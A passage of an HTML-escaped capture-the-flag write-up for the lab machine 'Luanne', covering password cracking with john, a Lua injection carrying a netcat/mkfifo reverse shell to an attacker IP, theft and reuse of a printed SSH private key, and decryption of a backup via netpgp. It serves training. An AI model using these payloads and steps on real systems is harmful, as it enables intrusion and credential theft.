Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;md5crypt-long, crypt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;and variants&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD5 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Will run 2 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
iamthebest &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;webapi_user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-02-19 17:09&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 3.571g/s 10628p/s 10628c/s 10628C/s sexy..14789632
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To get an reverse shell, I have executed the following HTTP request:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data-urlencode&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;city=London') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 1234 &amp;gt;/tmp/f') x=('&quot;&lt;/span&gt; http://10.10.10.218/weather/forecast
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User flag&lt;/h2&gt;

&lt;p&gt;Inspecting the running processes from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; execution, observed that user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.michaels&lt;/code&gt; has an copy of the lua script in execution on his profile. The idea was to get an reverse shell the same way we did at first, but the payload didn’t worked. This and the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;devel&lt;/code&gt; where this file reside indicate that this is a newer version patched for the existing vulnerability.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r.michaels 185 0.0 0.0 34992 1964 ? Is 5:56AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels
-b /home/r.michaels/devel/www
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;bozohttpd&quot;&gt;bozohttpd&lt;/h3&gt;

&lt;p&gt;A point that was being unnoticed so far is, that besides we were accessing the app on 80/TCP it was being published initially on 3000/TCP. As this implies that the app has a proxy on its publishing, inspecting the response header we have found a different server from inside the machine:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://127.0.0.1:3000
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
0 199 0 0 0 0 0 0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 0
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;
Content-Type: text/html
Content-Length: 199
Server: bozohttpd/20190228
Allow: GET, HEAD, POST
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Searching for bozohttpd, the server used for this publishing, I have found its &lt;a href=&quot;https://man.netbsd.org/NetBSD-7.0/bozohttpd.8&quot;&gt;&lt;strong&gt;man page&lt;/strong&gt;&lt;/a&gt; which describes one of its features: &lt;em&gt;~user translation&lt;/em&gt;, que allows us to access user’s virtual directories using requests like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://&amp;lt;server&amp;gt;/~&amp;lt;username&amp;gt;&lt;/code&gt;. This was confirmed by using the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:3000/~r.michaels &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; webapi_user
Enter host password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'webapi_user'&lt;/span&gt;:iamthebest
  
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 172 0 172 0 0 86000 0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 86000
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Document Moved&amp;lt;/h1&amp;gt;
This document had moved &amp;lt;a &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1:3000/~r.michaels/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;here&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As this instance on 3000/TCP is running with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_httpd&lt;/code&gt; account, we had not enough permissions to access r.michael’s directory but, as we noticed that there’s another instance of this app running on 3001/TCP, we could get the following result, where we can see an &lt;strong&gt;id_rsa&lt;/strong&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:3001/~r.michaels/id_rsa &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; webapi_user
Enter host password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'webapi_user'&lt;/span&gt;:iamthebest

% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 601 0 601 0 0 293k 0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 586k
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;meta &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;/&amp;gt;
&amp;lt;style &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
table &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
border-top: 1px solid black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
border-bottom: 1px solid black&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
th &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; background: aquamarine&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;:nth-child&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;even&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; background: lavender&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&amp;lt;/style&amp;gt;
&amp;lt;title&amp;gt;Index of ~r.michaels/&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Index of ~r.michaels/&amp;lt;/h1&amp;gt;
&amp;lt;table &lt;span class=&quot;nv&quot;&gt;cols&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3&amp;gt;
&amp;lt;thead&amp;gt;
&amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;th&amp;gt;Name&amp;lt;th&amp;gt;Last modified&amp;lt;th &lt;span class=&quot;nv&quot;&gt;align&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;right&amp;gt;Size
&amp;lt;tbody&amp;gt;
&amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;td&amp;gt;&amp;lt;a &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;../&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Parent Directory&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 18:20&amp;lt;td &lt;span class=&quot;nv&quot;&gt;align&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;right&amp;gt;1kB
&amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;td&amp;gt;&amp;lt;a &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id_rsa&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;id_rsa&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 16:52&amp;lt;td &lt;span class=&quot;nv&quot;&gt;align&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;right&amp;gt;3kB
&amp;lt;/table&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we have downloaded it we noticed that it is an OpenSSH key, which could possibly allow us to connect as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.michaels&lt;/code&gt; and obtain the user flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:3001/~r.michaels/id_rsa &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; webapi_user
Enter host password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;s1&quot;&gt;'webapi_user'&lt;/span&gt;:iamthebest

% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 2610 100 2610 0 0 2548k 0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 2548k
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; OPENSSH PRIVATE KEY-----
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
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; OPENSSH PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Validating the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; file, noticed that it isn’t a RSA key but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenSSH&lt;/code&gt;, where we’ll need to convert it before using. The procedure below allowed us to complete it easily:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Remove the line break at the end of the file after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-----END OPENSSH PRIVATE KEY-----&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Convert the OpenSSH to RSA using the command below, as well as the redefinition of its permissions so we could be able to use it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, entering a blank password to the exported key.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
ssh-keygen &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; PEM &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./id_rsa
Key has comment &lt;span class=&quot;s1&quot;&gt;'r.michaels@luanne.htb'&lt;/span&gt;
Enter new passphrase &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;no passphrase&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
Enter same passphrase again:
Your identification has been saved with the new passphrase.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Whit this key, the access using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.michaels&lt;/code&gt; was possible and we could obtain the user flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa r.michaels@10.10.10.218
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.218 (10.10.10.218)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '&lt;/span&gt;10.10.10.218&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
Last login: Sat Feb 20 07:14:11 2021 from 10.10.14.33
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
  
Welcome to NetBSD!
  
luanne$ id &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; ls -la
uid=1000(r.michaels) gid=100(users) groups=100(users)
/home/r.michaels
total 52
dr-xr-x--- 7 r.michaels users 512 Sep 16 18:20 .
drwxr-xr-x 3 root wheel 512 Sep 14 06:46 ..
-rw-r--r-- 1 r.michaels users 1772 Feb 14 2020 .cshrc
drwx------ 2 r.michaels users 512 Sep 14 17:16 .gnupg
-rw-r--r-- 1 r.michaels users 431 Feb 14 2020 .login
-rw-r--r-- 1 r.michaels users 265 Feb 14 2020 .logout
-rw-r--r-- 1 r.michaels users 1498 Feb 14 2020 .profile
-rw-r--r-- 1 r.michaels users 166 Feb 14 2020 .shrc
dr-x------ 2 r.michaels users 512 Sep 16 16:51 .ssh
dr-xr-xr-x 2 r.michaels users 512 Nov 24 09:26 backups
dr-xr-x--- 4 r.michaels users 512 Sep 16 15:02 devel
dr-x------ 2 r.michaels users 512 Sep 16 16:52 public_html
-r-------- 1 r.michaels users 33 Sep 16 17:16 user.txt
luanne$ cat user.txt
&amp;lt;redacted&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r.michaels&lt;/code&gt;`s  home directory, we have noticed an folder called backup, containing an encrypted file &lt;strong&gt;devel_backup-2020-09-16.tar.gz.enc&lt;/strong&gt;. To decrypt it we’ll need a passoword or key, depending on the way it was initially encrypted.&lt;/p&gt;

&lt;p&gt;Executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; as this user I have found some interesting information that will help us to find the path for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;User r.michaels has &lt;strong&gt;doas&lt;/strong&gt; privileges. This is equivalent as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;group in the other distributions that permits running tasks as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Checking doas.conf
permit r.michaels as root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;This user has a PGP key stored for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netpgp&lt;/code&gt;, that will possibly allow is to decrypt the file found on backup folder;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Do I have PGP keys?
gpg Not Found
/usr/bin/netpgpkeys
1 key found
&quot;pub&quot; 2048/&quot;RSA (Encrypt or Sign)&quot; &quot;op&quot; 2020-09-14
Key fingerprint: &quot;027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a &quot;
uid &quot;RSA 2048-bit key &amp;lt;r.michaels@localhost&amp;gt;&quot; &quot;&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Some user writable directories:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/home/r.michaels
/tmp
/var/mail
/var/mail/r.michaels
/var/shm
/var/spool/sockets
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the information above in hand, I have started with decrypting the file using the pgp key. For this I have used one of the user writable directories &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/shm&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luanne&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netpgp &lt;span class=&quot;nt&quot;&gt;--decrypt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/shm/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc
signature 2048/RSA &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Encrypt or Sign&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 3684eb1e5ded454a 2020-09-14
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a
uid RSA 2048-bit key &amp;lt;r.michaels@localhost&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Checking the decrypted content, we can see the files used in the API, as well as an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htpassword&lt;/code&gt; file, that besides already uses the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webapi_user&lt;/code&gt;, it has a different password hash.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tree &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; devel-2020-09-16
devel-2020-09-16
├── webapi
│ └── weather.lua
└── www
├── .htpasswd
└── index.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the same method as we did earlier, I cracked it and got the password &lt;strong&gt;littlebear&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;md5crypt-long ./www/.htpasswd
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;md5crypt-long, crypt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;and variants&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD5 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Will run 2 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
littlebear &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;webapi_user&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-02-20 16:02&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1.333g/s 17216p/s 17216c/s 17216C/s mirame..limewire
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

